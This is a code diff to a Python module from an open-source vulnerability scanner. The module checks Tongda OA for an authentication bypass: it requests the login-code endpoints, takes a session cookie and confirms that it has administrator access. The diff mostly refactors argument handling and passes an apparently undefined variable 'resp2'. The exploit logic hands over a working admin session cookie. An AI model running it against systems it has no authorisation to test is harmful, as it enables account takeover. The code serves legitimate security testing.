@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 __author__ = 'Ascotbe'
-from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies
+from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling
 import urllib3
 import requests
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -22,22 +22,17 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=Proxies().result(proxies)
-    scheme, url, port = UrlProcessing().result(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     try:
         payload = '/general/login_code.php'
-        payload_url = scheme + "://" + url + ":" + str(port) + payload
+        payload_url = url + payload
         payload2 ='/logincheck_code.php'
-        payload_url2 = scheme + "://" + url + ":" + str(port) + payload2
+        payload_url2 = url + payload2
         payload3="/general/index.php"
-        payload_url3 = scheme + "://" + url + ":" + str(port) + payload3
+        payload_url3 = url + payload3
 
         res = requests.get(payload_url, headers=Headers, proxies=proxies, timeout=6, verify=False)
         restext = str(res.text).split('{')
@@ -53,7 +48,7 @@ def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
         if code == 200 and (con.find("""<li><a id="on_status_1" href="javascript:""")!=-1 and con.find("""<a id="logout_btn" class="logout" href="javascript""")!=-1 ) or (con.find("通达云市场")!=-1 and con.find("通达OA在线帮助")!=-1 and con.find("注销")!=-1):
             Medusa = "{}存在通达OA任意使用管理员账号登录漏洞\r\n验证数据:\r\n管理员COOKIE:{}\r\n漏洞返回页面:{}\r\n".format(url,head,con)
             _t = VulnerabilityInfo(Medusa)
-            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
+            VulnerabilityDetails(_t.info, resp2,**kwargs).Write()  # 传入url和扫描到的数据
             WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
